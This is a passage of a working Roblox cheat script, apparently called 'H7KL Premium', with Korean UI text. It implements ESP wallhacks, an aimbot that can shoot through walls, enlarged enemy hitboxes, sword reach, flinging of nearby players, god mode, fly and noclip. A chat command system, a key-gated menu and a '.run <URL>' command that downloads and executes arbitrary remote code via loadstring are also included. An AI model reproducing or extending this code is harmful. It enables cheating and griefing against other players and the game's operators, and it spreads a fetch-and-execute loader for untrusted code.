        distText.Size = 12; distText.Center = true; distText.Outline = true
        distText.Color = state.espTextColor; distText.Visible = false
        data.distText = distText
        local hpBar = Drawing.new("Line")
        hpBar.Thickness = 3; hpBar.Color = Color3.fromRGB(0, 255, 0)
        hpBar.Transparency = 1; hpBar.Visible = false
        data.hpBar = hpBar
    end
    espObjects[char] = data
    return data
end

local function isTeammate(plr)
    if not state.espTeam then return false end
    if plr.Team and lp.Team and plr.Team == lp.Team then return true end
    return false
end

RunService.RenderStepped:Connect(function()
    if not state.espOn then
        for _, data in pairs(espObjects) do
            if data.outline then data.outline.Enabled = false end
            if data.box then for _, l in pairs(data.box) do l.Visible = false end end
            if data.headDot then data.headDot.Visible = false end
            if data.nameText then data.nameText.Visible = false end
            if data.distText then data.distText.Visible = false end
            if data.hpBar then data.hpBar.Visible = false end
        end
        return
    end
    local cam = workspace.CurrentCamera
    if not cam then return end
    local myPos = cam.CFrame.Position

    local targets = {}
    for _, plr in ipairs(Players:GetPlayers()) do
        if plr ~= lp and plr.Character and not isTeammate(plr) then
            local h = plr.Character:FindFirstChildOfClass("Humanoid")
            if h and h.Health > 0 then
                table.insert(targets, {char = plr.Character, name = plr.Name, hum = h})
            end
        end
    end
    if state.espNPC then
        for _, m in ipairs(npcCache) do
            if m and m.Parent then
                local h = m:FindFirstChildOfClass("Humanoid")
                if h and h.Health > 0 then table.insert(targets, {char = m, name = m.Name, hum = h}) end
            end
        end
    end
    for char, _ in pairs(espObjects) do
        local valid = false
        for _, t in ipairs(targets) do if t.char == char then valid = true; break end end
        if not valid then removeESP(char) end
    end

    for _, t in ipairs(targets) do
        local char = t.char
        local hrp2 = char:FindFirstChild("HumanoidRootPart") or char.PrimaryPart
        local head = char:FindFirstChild("Head")
        if hrp2 and head then
            local data = createESP(char)
            local dist = (hrp2.Position - myPos).Magnitude
            if data.outline then
                data.outline.OutlineColor = state.espColor
                data.outline.Enabled = state.espOutline
            end
            if dist > state.espMaxDist then
                if data.box then for _, l in pairs(data.box) do l.Visible = false end end
                if data.headDot then data.headDot.Visible = false end
                if data.nameText then data.nameText.Visible = false end
                if data.distText then data.distText.Visible = false end
                if data.hpBar then data.hpBar.Visible = false end
                if data.outline then data.outline.Enabled = false end
            elseif hasDrawing then
                local hrpScreen, hrpOn = cam:WorldToViewportPoint(hrp2.Position)
                local headScreen, headOn = cam:WorldToViewportPoint(head.Position)
                if hrpOn and headOn then
                    if data.box and state.espBox then
                        local headPos = Vector2.new(headScreen.X, headScreen.Y)
                        local rootPos = Vector2.new(hrpScreen.X, hrpScreen.Y)
                        local height = math.abs(rootPos.Y - headPos.Y) * 2.4
                        local width = height * 0.55
                        local topY = headPos.Y - height * 0.25
                        data.box.tl.From = Vector2.new(headPos.X - width/2, topY); data.box.tl.To = Vector2.new(headPos.X + width/2, topY)
                        data.box.tr.From = Vector2.new(headPos.X + width/2, topY); data.box.tr.To = Vector2.new(headPos.X + width/2, topY + height)
                        data.box.bl.From = Vector2.new(headPos.X - width/2, topY + height); data.box.bl.To = Vector2.new(headPos.X + width/2, topY + height)
                        data.box.br.From = Vector2.new(headPos.X - width/2, topY); data.box.br.To = Vector2.new(headPos.X - width/2, topY + height)
                        for _, l in pairs(data.box) do l.Color = state.espColor; l.Visible = true end
                    elseif data.box then
                        for _, l in pairs(data.box) do l.Visible = false end
                    end
                    if data.headDot then
                        data.headDot.Position = Vector2.new(headScreen.X, headScreen.Y)
                        data.headDot.Color = state.espColor
                        data.headDot.Visible = state.espHead
                    end
                    if data.nameText then
                        data.nameText.Position = Vector2.new(headScreen.X, headScreen.Y - 30)
                        data.nameText.Text = t.name
                        data.nameText.Color = state.espTextColor
                        data.nameText.Visible = state.espShowName
                    end
                    if data.distText then
                        data.distText.Position = Vector2.new(headScreen.X, headScreen.Y - 15)
                        data.distText.Text = string.format("[%d]", math.floor(dist))
                        data.distText.Color = state.espTextColor
                        data.distText.Visible = state.espShowDistance
                    end
                    if data.hpBar and state.espShowHealth then
                        local hpPct = t.hum.Health / t.hum.MaxHealth
                        local barWidth = 50
                        local barY = headScreen.Y - 40
                        data.hpBar.From = Vector2.new(headScreen.X - barWidth/2, barY)
                        data.hpBar.To = Vector2.new(headScreen.X - barWidth/2 + barWidth * hpPct, barY)
                        data.hpBar.Color = hpPct > 0.6 and Color3.fromRGB(0,255,0) or (hpPct > 0.3 and Color3.fromRGB(255,255,0) or Color3.fromRGB(255,0,0))
                        data.hpBar.Visible = true
                    elseif data.hpBar then
                        data.hpBar.Visible = false
                    end
                end
            end
        end
    end
end)

Players.PlayerRemoving:Connect(function(plr) if plr.Character then removeESP(plr.Character) end end)
local function clearAllESP() for char in pairs(espObjects) do removeESP(char) end end

-- =========================================================
-- 히트박스
-- =========================================================
local hbData = {}
local HB_PARTS = {"Head","HumanoidRootPart","Torso","UpperTorso","LowerTorso"}
local function isHbPart(p)
    if not p:IsA("BasePart") then return false end
    for _, n in ipairs(HB_PARTS) do if p.Name == n then return true end end
    return false
end
local function saveHb(model)
    if hbData[model] then return end
    hbData[model] = {}
    for _, p in ipairs(model:GetDescendants()) do
        if isHbPart(p) then
            hbData[model][p] = {size = p.Size, trans = p.Transparency, col = p.Color, mat = p.Material, col2 = p.CanCollide}
        end
    end
end
local function applyHb(model)
    if not model or model == lp.Character then return end
    if state.hbOn then
        saveHb(model)
        for _, p in ipairs(model:GetDescendants()) do
            if isHbPart(p) then
                safeCall(function()
                    p.Size = Vector3.new(state.hbSize, state.hbSize, state.hbSize)
                    p.Transparency = state.hbTrans
                    p.Color = state.hbColor
                    p.Material = Enum.Material.Neon
                    p.CanCollide = false
                end)
            end
        end
    else
        local d = hbData[model]
        if d then
            for p, i in pairs(d) do
                if p and p.Parent then
                    safeCall(function()
                        p.Size = i.size; p.Transparency = i.trans; p.Color = i.col
                        p.Material = i.mat; p.CanCollide = i.col2
                    end)
                end
            end
            hbData[model] = nil
        end
    end
end
local function applyHbAll()
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= lp and p.Character then applyHb(p.Character) end
    end
    if state.hbNPC then
        for _, o in ipairs(npcCache) do if o and o.Parent then applyHb(o) end end
    end
end
local function setHb(on) state.hbOn = on; applyHbAll() end
task.spawn(function()
    while true do
        task.wait(0.5)
        if state.hbOn then applyHbAll() end
    end
end)

-- =========================================================
-- 댄스
-- =========================================================
local curMusic, curTrack
local DANCES = {
    dance1 = "rbxassetid://507771019", dance2 = "rbxassetid://507776043",
    dance3 = "rbxassetid://507776720", floss = "rbxassetid://5915671715",
    dorky = "rbxassetid://5915714726", monkey = "rbxassetid://5915755123",
    robot = "rbxassetid://507776879",
}
local SONGS = {
    default = "rbxassetid://1837879082", party = "rbxassetid://1837879082",
    funny = "rbxassetid://1836315841", epic = "rbxassetid://1836190483",
}
local function stopDance()
    if curMusic then safeCall(function() curMusic:Destroy() end); curMusic = nil end
    if curTrack then safeCall(function() curTrack:Stop() end); curTrack = nil end
end
local function dance(key, song)
    stopDance()
    local c = lp.Character
    if not c then return end
    local h = c:FindFirstChildOfClass("Humanoid")
    if not h then return end
    for _, p in ipairs(c:GetDescendants()) do
        if p:IsA("BasePart") then
            safeCall(function() p.Color = Color3.fromRGB(math.random(0,255), math.random(0,255), math.random(0,255)) end)
        end
    end
    local anim = Instance.new("Animation")
    anim.AnimationId = DANCES[key] or DANCES.dance1
    safeCall(function()
        curTrack = h:LoadAnimation(anim)
        curTrack.Priority = Enum.AnimationPriority.Action
        curTrack.Looped = true
        curTrack:Play()
    end)
    local s = Instance.new("Sound")
    s.SoundId = SONGS[song] or SONGS.default
    s.Volume = 2; s.Looped = true
    s.Parent = c:FindFirstChild("Head") or c
    safeCall(function() s:Play() end)
    curMusic = s
    notify("춤 재생")
end

-- =========================================================
-- 외부 스크립트 실행
-- =========================================================
local function executeExternalScript(url)
    if not url or url == "" then notify("URL 없음"); return end
    task.spawn(function()
        local ok, err = pcall(function()
            local content = httpGet(url)
            if not content or #content < 10 then error("빈 응답") end
            local fn = loadstring(content)
            if not fn then error("loadstring 실패") end
            fn()
        end)
        if ok then notify("스크립트 실행 완료") else notify("실패: " .. tostring(err):sub(1, 100)) end
    end)
end

-- =========================================================
-- 명령어
-- =========================================================
local Cmds = {}
local function cmd(name, desc, fn) Cmds[name:lower()] = {name = name, desc = desc, fn = fn} end

cmd("fly", "플라이", function(a)
    local mode = a[#a] and a[#a]:lower()
    if mode == "off" then setFly(false); notify("플라이 OFF"); return end
    local n = numArg(a, 1)
    if n then state.flySpeed = math.clamp(n, 10, 500) end
    setFly(true); notify("플라이 ON")
end)
cmd("noclip", "노클립", function(a)
    local mode = a[1] and a[1]:lower()
    if mode == "on" then setNoclip(true); notify("노클립 ON")
    elseif mode == "off" then setNoclip(false); notify("노클립 OFF")
    else setNoclip(not state.noclip); notify("노클립 " .. (state.noclip and "ON" or "OFF")) end
end)
cmd("nc", "노클립", function(a) Cmds.noclip.fn(a) end)
cmd("speed", "속도", function(a)
    local n = numArg(a, 1)
    if not n then notify(".speed 100"); return end
    state.ws = math.clamp(n, 0, 1000); applyWS(); notify("속도 " .. state.ws)
end)
cmd("ws", "속도", function(a) Cmds.speed.fn(a) end)
cmd("jump", "점프력", function(a)
    local n = numArg(a, 1)
    if not n then notify(".jump 100"); return end
    state.jp = math.clamp(n, 0, 1000); applyJP(); notify("점프 " .. state.jp)
end)
cmd("jp", "점프력", function(a) Cmds.jump.fn(a) end)
cmd("infjump", "무한 점프", function(a)
    local mode = a[1] and a[1]:lower()
    if mode == "on" then state.infiniteJump = true; notify("무한 점프 ON")
    elseif mode == "off" then state.infiniteJump = false; notify("무한 점프 OFF")
    else state.infiniteJump = not state.infiniteJump; notify("무한 점프 " .. (state.infiniteJump and "ON" or "OFF")) end
end)
cmd("god", "무적", function(a)
    local mode = a[1] and a[1]:lower()
    if mode == "on" then setGod(true); notify("무적 ON")
    elseif mode == "off" then setGod(false); notify("무적 OFF")
    else setGod(not state.god); notify("무적 " .. (state.god and "ON" or "OFF")) end
end)
cmd("invis", "투명화", function(a)
    local mode = a[1] and a[1]:lower()
    if mode == "on" then setInvis(true); notify("투명화 ON")
    elseif mode == "off" then setInvis(false); notify("투명화 OFF")
    else setInvis(not state.invis); notify("투명화 " .. (state.invis and "ON" or "OFF")) end
end)
cmd("reach", "검 리치", function(a)
    local mode = a[1] and a[1]:lower()
    local n = numArg(a, 1)
    if n then state.reachSize = math.clamp(n, 5, 60) end
    if mode == "on" then setReach(true); notify("리치 ON")
    elseif mode == "off" then setReach(false); notify("리치 OFF")
    else setReach(not state.reachOn); notify("리치 " .. (state.reachOn and "ON" or "OFF")) end
end)
cmd("fling", "플링 (근처 전체)", function() flingAll(); notify("플링!") end)
cmd("flingall", "플링 (전체)", function() flingAll(); notify("플링!") end)
cmd("spin", "회전", function(a)
    local n = numArg(a, 1)
    if n then state.spinSpeed = n end
    setSpin(not state.spinning)
    notify("회전 " .. (state.spinning and "ON" or "OFF"))
end)
cmd("antifling", "날리기 방지", function(a)
    local mode = a[1] and a[1]:lower()
    if mode == "on" then setAntiFling(true); notify("Anti-Fling ON")
    elseif mode == "off" then setAntiFling(false); notify("Anti-Fling OFF")
    else setAntiFling(not state.antiFling); notify("Anti-Fling " .. (state.antiFling and "ON" or "OFF")) end
end)
cmd("antivoid", "공허 방지", function(a)
    local mode = a[1] and a[1]:lower()
    if mode == "on" then setAntiVoid(true); notify("Anti-Void ON")
    elseif mode == "off" then setAntiVoid(false); notify("Anti-Void OFF")
    else setAntiVoid(not state.antiVoid); notify("Anti-Void " .. (state.antiVoid and "ON" or "OFF")) end
end)
cmd("antiafk", "자리비움 방지", function(a)
    local mode = a[1] and a[1]:lower()
    if mode == "on" then setAntiAFK(true); notify("Anti-AFK ON")
    elseif mode == "off" then setAntiAFK(false); notify("Anti-AFK OFF")
    else setAntiAFK(not state.antiAFK); notify("Anti-AFK " .. (state.antiAFK and "ON" or "OFF")) end
end)
cmd("autorespawn", "자동 리스폰", function(a)
    local mode = a[1] and a[1]:lower()
    if mode == "on" then setAutoRespawn(true); notify("Auto-Respawn ON")
    elseif mode == "off" then setAutoRespawn(false); notify("Auto-Respawn OFF")
    else setAutoRespawn(not state.autoRespawn); notify("Auto-Respawn " .. (state.autoRespawn and "ON" or "OFF")) end
end)
cmd("fpsunlock", "FPS 언락", function(a)
    local mode = a[1] and a[1]:lower()
    if mode == "on" then setFPSUnlock(true); notify("FPS 언락 ON")
    elseif mode == "off" then setFPSUnlock(false); notify("FPS 언락 OFF")
    else setFPSUnlock(not state.fpsUnlock); notify("FPS 언락 " .. (state.fpsUnlock and "ON" or "OFF")) end
end)
cmd("re", "리스폰", function() respawnNormal(); notify("리스폰") end)
cmd("res", "제자리 리스폰", function() respawnHere(); notify("제자리") end)
cmd("revive", "부활", function() revive(); notify("부활") end)
cmd("rv", "부활", function() revive(); notify("부활") end)
cmd("부활", "부활", function() revive(); notify("부활") end)
cmd("tp", "플레이어 TP", function(a)
    local n = a[1]
    if not n then notify(".tp 이름"); return end
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= lp and p.Name:lower():sub(1, #n) == n:lower() then
            tpTo(p); notify(p.Name .. "에게 TP"); return
        end
    end
    notify("없음")
end)
cmd("goto", "플레이어 TP", function(a) Cmds.tp.fn(a) end)
cmd("tppos", "좌표 TP", function(a)
    local x, y, z = tonumber(a[1]), tonumber(a[2]), tonumber(a[3])
    if not (x and y and z) then notify(".tppos 0 50 0"); return end
    tpPos(x, y, z); notify("TP")
end)
cmd("aim", "에임봇", function(a)
    local mode = a[1] and a[1]:lower()
    if mode == "on" then state.aimOn = true; notify("에임 ON")
    elseif mode == "off" then state.aimOn = false; notify("에임 OFF")
    else state.aimOn = not state.aimOn; notify("에임 " .. (state.aimOn and "ON" or "OFF")) end
    updateCircle()
end)
cmd("aimfov", "에임 FOV", function(a)
    local n = numArg(a, 1)
    if not n then notify(".aimfov 200"); return end
    state.aimFOV = math.clamp(n, 20, 800); updateCircle(); notify("FOV " .. state.aimFOV)
end)
cmd("stronglock", "강한 고정", function(a)
    local mode = a[1] and a[1]:lower()
    if mode == "on" then state.aimStrongLock = true; notify("Strong Lock ON")
    elseif mode == "off" then state.aimStrongLock = false; notify("Strong Lock OFF")
    else state.aimStrongLock = not state.aimStrongLock; notify("Strong Lock " .. (state.aimStrongLock and "ON" or "OFF")) end
end)
cmd("esp", "ESP 토글", function(a)
    local mode = a[1] and a[1]:lower()
    if mode == "on" then state.espOn = true; notify("ESP ON")
    elseif mode == "off" then state.espOn = false; clearAllESP(); notify("ESP OFF")
    else state.espOn = not state.espOn; if not state.espOn then clearAllESP() end; notify("ESP " .. (state.espOn and "ON" or "OFF")) end
end)
cmd("hb", "히트박스", function(a)
    local mode = a[1] and a[1]:lower()
    if mode == "on" then setHb(true); notify("히트박스 ON")
    elseif mode == "off" then setHb(false); notify("히트박스 OFF")
    else setHb(not state.hbOn); notify("히트박스 " .. (state.hbOn and "ON" or "OFF")) end
end)
cmd("hbsize", "히트박스 크기", function(a)
    local n = numArg(a, 1)
    if not n then notify(".hbsize 10"); return end
    state.hbSize = math.clamp(n, 1, 50); applyHbAll(); notify("크기 " .. state.hbSize)
end)
cmd("dance", "춤", function(a) dance(a[1] or "dance1", a[2] or "party") end)
cmd("macro", "매크로", function(a)
    local mode = a[1] and a[1]:lower()
    if mode == "on" then startMacro(); notify("매크로 ON")
    elseif mode == "off" then stopMacro(); notify("매크로 OFF")
    else if state.macroOn then stopMacro(); notify("매크로 OFF") else startMacro(); notify("매크로 ON") end end
end)
cmd("bright", "밝기", function(a)
    local n = numArg(a, 1)
    if not n then notify(".bright 30"); return end
    state.bright = math.clamp(n, 0, 60)
    applyLights(); applyLighting()
    notify("밝기 " .. state.bright)
end)
cmd("fov", "FOV", function(a)
    local n = numArg(a, 1)
    if not n then notify(".fov 70"); return end
    state.fov = math.clamp(n, 20, 120); applyFOV(); notify("FOV " .. state.fov)
end)
cmd("fullbright", "풀브라이트", function()
    state.bright = 60; state.range = 200
    applyLights(); applyLighting(); notify("풀브라이트")
end)
cmd("fb", "풀브라이트", function() Cmds.fullbright.fn({}) end)
cmd("btools", "빌드 툴", function()
    safeCall(function()
        local bp = lp:FindFirstChildOfClass("Backpack")
        if not bp then return end
        for _, t in ipairs({Enum.BinType.Hammer, Enum.BinType.Clone, Enum.BinType.Grab, Enum.BinType.GameTool}) do
            local bin = Instance.new("HopperBin")
            bin.BinType = t; bin.Parent = bp
        end
        notify("빌드 툴 지급")
    end)
end)
cmd("run", "외부 스크립트 실행", function(a)
    local url = a[1]
    if not url then notify(".run <URL>"); return end
    executeExternalScript(url)
end)
cmd("reset", "리셋", function()
    state.ws = nil; state.jp = nil; state.fov = nil; state.bright = nil; state.hipHeight = nil
    setGod(false); setFly(false); setNoclip(false); setInvis(false); setSpin(false)
    setTouchTP(false); setHb(false); setReach(false); stopDance(); clearAllESP()
    setAntiFling(false); setAntiVoid(false); setAntiAFK(false); setAutoRespawn(false); setFPSUnlock(false)
    state.infiniteJump = false; state.aimOn = false; state.espOn = false
    updateCircle(); applyFOV(); applyLights(); applyLighting()
    notify("리셋")
end)
cmd("help", "명령어 목록", function()
    local t = {}
    for k in pairs(Cmds) do table.insert(t, state.prefix .. k) end
    table.sort(t)
    notify(table.concat(t, " "), "명령어 " .. #t .. "개")
end)
cmd("cmds", "명령어 목록", function() Cmds.help.fn({}) end)

-- =========================================================
-- 채팅 훅
-- =========================================================
local function onChat(msg)
    if not state.chatOn then return end
    local px = state.prefix
    if px == "" or msg:sub(1, #px) ~= px then return end
    local content = msg:sub(#px + 1)
    local args = {}
    for w in content:gmatch("%S+") do table.insert(args, w) end
    if #args == 0 then return end
    local name = args[1]:lower()
    table.remove(args, 1)
    local c = Cmds[name]
    if c then
        local ok, err = pcall(c.fn, args)
        if not ok then notify("오류: " .. tostring(err)) end
    else
        notify("모르는 명령어 " .. px .. name)
    end
end

safeCall(function()
    local TCS = game:GetService("TextChatService")
    if TCS.ChatVersion == Enum.ChatVersion.TextChatService then
        local ch = TCS:WaitForChild("TextChannels", 5)
        if ch then
            local rb = ch:FindFirstChild("RBXGeneral")
            if rb then
                rb.MessageReceived:Connect(function(m)
                    local t = m.Text
                    local px = state.prefix
                    if t and px ~= "" and t:sub(1, #px) == px then
                        safeCall(function() m:Destroy() end)
                        onChat(t)
                    end
                end)
            end
        end
    end
end)
safeCall(function() lp.Chatted:Connect(onChat) end)

lp.CharacterAdded:Connect(function()
    task.wait(0.5)
    local wasFly = state.fly
    local wasGod = state.god
    local wasNoclip = state.noclip
    local wasInvis = state.invis
    local wasReach = state.reachOn
    stopFly()
    if spinConn then safeCall(function() spinConn:Disconnect() end); spinConn = nil end
    state.spinning = false
    applyWS(); applyJP(); applyFOV(); applyLights()
    if wasNoclip then task.wait(0.2); setNoclip(true) end
    if wasGod then task.wait(0.3); enableGod() end
    if wasFly then task.wait(0.3); startFly() end
    if wasInvis then task.wait(0.3); setInvis(true) end
    if wasReach then task.wait(0.3); setReach(true) end
end)

-- =========================================================
-- UI
-- =========================================================
local Window = Rayfield:CreateWindow({
    Name = "H7KL Premium",
    LoadingTitle = "H7KL Premium 로딩중...",
    LoadingSubtitle = "developed by wangwei",
    Theme = "Ocean",
    ConfigurationSaving = {Enabled = false},
    KeySystem = true,
    KeySettings = {
        Title = "H7KL Premium",
        Subtitle = "디스코드에서 키를 얻으세요",
        Note = "키: discord.gg/h7kl • by wangwei",
        FileName = "H7KL_Key",
        SaveKey = true,
        GrabKeyFromSite = false,
        Key = {"mkm1314*1"}
    },
    Size = UDim2.fromOffset(1400, 260),
})

-- 🎨 진짜 하늘색 강제 적용
task.wait(0.6)
safeCall(function()
    Rayfield:ChangeColor(Color3.fromRGB(90, 175, 255))
end)

-- 추가적인 하늘색 틴트 (ChangeColor 안 먹는 경우 대비)
task.spawn(function()
    task.wait(1.5)
    local CG = game:GetService("CoreGui")
    local gui
    for _, g in ipairs(CG:GetChildren()) do
        if g:IsA("ScreenGui") and g.Name:lower():find("rayfield") then gui = g; break end
    end
    if not gui then return end
    local SKY = Color3.fromRGB(90, 175, 255)
    for _, obj in ipairs(gui:GetDescendants()) do
        pcall(function()
            if (obj:IsA("Frame") or obj:IsA("TextButton")) and obj.BackgroundColor3 then
                local bg = obj.BackgroundColor3
                if bg.R > 0.35 and bg.B > 0.35 and bg.G < bg.R and bg.G < bg.B then
                    obj.BackgroundColor3 = SKY
                end
            end
            if (obj:IsA("TextLabel") or obj:IsA("TextButton")) and obj.TextColor3 then
                local tc = obj.TextColor3
                if tc.R > 0.35 and tc.B > 0.35 and tc.G < tc.R and tc.G < tc.B then
                    obj.TextColor3 = SKY
                end
            end
            if obj:IsA("ImageLabel") then
                obj.ImageColor3 = SKY
            end
        end)
    end
end)

-- =========================================================
-- 탭
-- =========================================================
local AimTab = Window:CreateTab("에임", 7733973221)
AimTab:CreateSection("AimBot")
AimTab:CreateToggle({Name = "Aimbot (Q)", CurrentValue = false, Flag = "aOn",
    Callback = function(v) state.aimOn = v; updateCircle() end})
AimTab:CreateToggle({Name = "Strong Lock", CurrentValue = false, Flag = "aSL",
    Callback = function(v) state.aimStrongLock = v; if not v then lockedTarget = nil end end})
AimTab:CreateToggle({Name = "Wallcheck (OFF = 벽 뚫기)", CurrentValue = false, Flag = "aWC",
    Callback = function(v) state.aimVisible = v end})
AimTab:CreateButton({Name = "Aim: Head (클릭 = Head↔Body)",
    Callback = function() state.aimPart = state.aimPart == "Head" and "Body" or "Head"; notify("Aim: " .. state.aimPart) end})
AimTab:CreateSlider({Name = "FOV", Range = {20, 800}, Increment = 5, CurrentValue = 200, Flag = "aFov",
    Callback = function(v) state.aimFOV = v; updateCircle() end})
AimTab:CreateSlider({Name = "Exclude", Range = {0, 20}, Increment = 1, CurrentValue = 0, Flag = "aEx",
    Callback = function(v) state.aimExclude = v end})
AimTab:CreateToggle({Name = "마우스 따라다니기", CurrentValue = false, Flag = "aMF",
    Callback = function(v) state.aimMouseFollow = v end})
AimTab:CreateToggle({Name = "토글 모드 (OFF = 우클릭 홀드)", CurrentValue = false, Flag = "aHold",
    Callback = function(v) state.aimHold = not v end})
AimTab:CreateSlider({Name = "부드러움", Range = {0.05, 1}, Increment = 0.05, CurrentValue = 0.3, Flag = "aSm",
    Callback = function(v) state.aimSmooth = v end})
AimTab:CreateToggle({Name = "같은 팀 무시", CurrentValue = false, Flag = "aTeam",
    Callback = function(v) state.aimTeam = v end})
AimTab:CreateToggle({Name = "더미/NPC 타겟", CurrentValue = true, Flag = "aNPC",
    Callback = function(v) state.aimNPC = v end})

local EspTab = Window:CreateTab("ESP", 7734039689)
EspTab:CreateToggle({Name = "ESP ON/OFF", CurrentValue = false, Flag = "espOn",
    Callback = function(v) state.espOn = v; if not v then clearAllESP() end end})
EspTab:CreateSection("표시")
EspTab:CreateToggle({Name = "테두리 (Outline)", CurrentValue = false, Flag = "espOutline",
    Callback = function(v) state.espOutline = v end})
EspTab:CreateToggle({Name = "머리 (Head)", CurrentValue = false, Flag = "espHead",
    Callback = function(v) state.espHead = v end})
EspTab:CreateToggle({Name = "네모 (Box)", CurrentValue = false, Flag = "espBox",
    Callback = function(v) state.espBox = v end})
EspTab:CreateToggle({Name = "이름", CurrentValue = true, Flag = "espName",
    Callback = function(v) state.espShowName = v end})
EspTab:CreateToggle({Name = "거리", CurrentValue = true, Flag = "espDist",
    Callback = function(v) state.espShowDistance = v end})
EspTab:CreateToggle({Name = "체력바", CurrentValue = false, Flag = "espHP",
    Callback = function(v) state.espShowHealth = v end})
EspTab:CreateSection("설정")
EspTab:CreateColorPicker({Name = "ESP 색상", Color = Color3.fromRGB(90, 175, 255), Flag = "espCol",
    Callback = function(c) state.espColor = c end})
EspTab:CreateColorPicker({Name = "텍스트 색상", Color = Color3.fromRGB(255, 255, 255), Flag = "espTxtCol",
    Callback = function(c) state.espTextColor = c end})
EspTab:CreateSlider({Name = "최대 거리", Range = {50, 5000}, Increment = 50, Suffix = "studs",
    CurrentValue = 1500, Flag = "espMax",
    Callback = function(v) state.espMaxDist = v end})
EspTab:CreateToggle({Name = "NPC ESP", CurrentValue = true, Flag = "espNPC",
    Callback = function(v) state.espNPC = v end})
EspTab:CreateToggle({Name = "같은 팀 제외", CurrentValue = false, Flag = "espTeam",
    Callback = function(v) state.espTeam = v end})

local HbTab = Window:CreateTab("히트박스", 7733965831)
HbTab:CreateToggle({Name = "히트박스 ON/OFF", CurrentValue = false, Flag = "hbOn",
    Callback = function(v) setHb(v) end})
HbTab:CreateToggle({Name = "NPC 적용", CurrentValue = true, Flag = "hbNPC",
    Callback = function(v) state.hbNPC = v; if state.hbOn then applyHbAll() end end})
HbTab:CreateSlider({Name = "크기", Range = {1, 50}, Increment = 1, Suffix = "studs",
    CurrentValue = 10, Flag = "hbSize",
    Callback = function(v) state.hbSize = v; if state.hbOn then applyHbAll() end end})
HbTab:CreateSlider({Name = "투명도", Range = {0, 1}, Increment = 0.05,
    CurrentValue = 0.5, Flag = "hbTr",
    Callback = function(v) state.hbTrans = v; if state.hbOn then applyHbAll() end end})
HbTab:CreateColorPicker({Name = "색상", Color = Color3.fromRGB(255, 60, 60), Flag = "hbCol",
    Callback = function(c) state.hbColor = c; if state.hbOn then applyHbAll() end end})

-- 🆕 전투 탭 (리치/fling)
local CombatTab = Window:CreateTab("전투", 7734006596)
CombatTab:CreateSection("검 리치 (Sword Reach)")
CombatTab:CreateToggle({Name = "리치 ON/OFF", CurrentValue = false, Flag = "rchOn",
    Callback = function(v) setReach(v) end})
CombatTab:CreateSlider({Name = "리치 크기", Range = {5, 60}, Increment = 1, Suffix = "studs",
    CurrentValue = 10, Flag = "rchSize",
    Callback = function(v) state.reachSize = v; if state.reachOn then updateReach() end end})
CombatTab:CreateSection("Fling")
CombatTab:CreateButton({Name = "🔥 근처 전체 플링", Callback = function() flingAll(); notify("플링!") end})
CombatTab:CreateSection("회전")
CombatTab:CreateToggle({Name = "회전", CurrentValue = false, Flag = "spin",
    Callback = function(v) setSpin(v) end})
CombatTab:CreateSlider({Name = "회전 속도", Range = {1, 100}, Increment = 1,
    CurrentValue = 10, Flag = "spd",
    Callback = function(v) state.spinSpeed = v end})

local MTab = Window:CreateTab("이동", 7733977721)
MTab:CreateSection("속도 & 점프")
MTab:CreateSlider({Name = "이동 속도", Range = {0, 1000}, Increment = 1, Suffix = "studs",
    CurrentValue = 16, Flag = "ws",
    Callback = function(v) state.ws = v; applyWS() end})
MTab:CreateSlider({Name = "점프력", Range = {0, 1000}, Increment = 1, Suffix = "power",
    CurrentValue = 50, Flag = "jp",
    Callback = function(v) state.jp = v; applyJP() end})
MTab:CreateSlider({Name = "HipHeight", Range = {0, 20}, Increment = 0.5,
    CurrentValue = 2, Flag = "hh",
    Callback = function(v) state.hipHeight = v; local h = hum(); if h then h.HipHeight = v end end})
MTab:CreateToggle({Name = "무한 점프", CurrentValue = false, Flag = "infJump",
    Callback = function(v) state.infiniteJump = v end})
MTab:CreateSection("플라이 / 노클립")
MTab:CreateSlider({Name = "플라이 속도", Range = {10, 500}, Increment = 1, Suffix = "studs/s",
    CurrentValue = 55, Flag = "fSpd",
    Callback = function(v) state.flySpeed = v end})
MTab:CreateToggle({Name = "플라이 (Space↑ / Shift↓)", CurrentValue = false, Flag = "fly",
    Callback = function(v) setFly(v) end})
MTab:CreateToggle({Name = "노클립", CurrentValue = false, Flag = "nc",
    Callback = function(v) setNoclip(v) end})
MTab:CreateSection("상태")
MTab:CreateToggle({Name = "무적 (God Mode)", CurrentValue = false, Flag = "god",
    Callback = function(v) setGod(v) end})
MTab:CreateToggle({Name = "투명화 (남에게도 안 보임)", CurrentValue = false, Flag = "invis",
    Callback = function(v) setInvis(v) end})
MTab:CreateSection("안티")
MTab:CreateToggle({Name = "Anti-Fling", CurrentValue = false, Flag = "afl",
    Callback = function(v) setAntiFling(v) end})
MTab:CreateToggle({Name = "Anti-Void", CurrentValue = false, Flag = "avd",
    Callback = function(v) setAntiVoid(v) end})
MTab:CreateToggle({Name = "Anti-AFK", CurrentValue = false, Flag = "aafk",
    Callback = function(v) setAntiAFK(v) end})
MTab:CreateToggle({Name = "Auto-Respawn", CurrentValue = false, Flag = "arsp",
    Callback = function(v) setAutoRespawn(v) end})
MTab:CreateToggle({Name = "FPS 언락", CurrentValue = false, Flag = "fps",
    Callback = function(v) setFPSUnlock(v) end})
MTab:CreateSection("리스폰")
MTab:CreateButton({Name = "리스폰 (.re)", Callback = function() respawnNormal() end})
MTab:CreateButton({Name = "제자리 리스폰 (.res)", Callback = function() respawnHere() end})
MTab:CreateButton({Name = "부활 (.revive)", Callback = function() revive() end})

local VTab = Window:CreateTab("시야", 7734052749)
VTab:CreateSlider({Name = "밝기", Range = {0, 60}, Increment = 1,
    CurrentValue = 10, Flag = "br",
    Callback = function(v) state.bright = v; applyLights(); applyLighting() end})
VTab:CreateSlider({Name = "라이트 범위", Range = {0, 200}, Increment = 1, Suffix = "studs",
    CurrentValue = 60, Flag = "rng",
    Callback = function(v) state.range = v; applyLights() end})
VTab:CreateSlider({Name = "FOV", Range = {20, 120}, Increment = 1,
    CurrentValue = 70, Flag = "fov",
    Callback = function(v) state.fov = v; applyFOV() end})
VTab:CreateButton({Name = "FOV 리셋", Callback = function() state.fov = 70; applyFOV() end})
VTab:CreateButton({Name = "풀브라이트", Callback = function()
    state.bright = 60; state.range = 200
    applyLights(); applyLighting() end})

local TTab = Window:CreateTab("TP", 7734013571)
TTab:CreateToggle({Name = "터치 TP", CurrentValue = false, Flag = "tTP",
    Callback = function(v) setTouchTP(v) end})

local pDropdown
local function refreshP()
    local t = {}
    for _, p in ipairs(Players:GetPlayers()) do
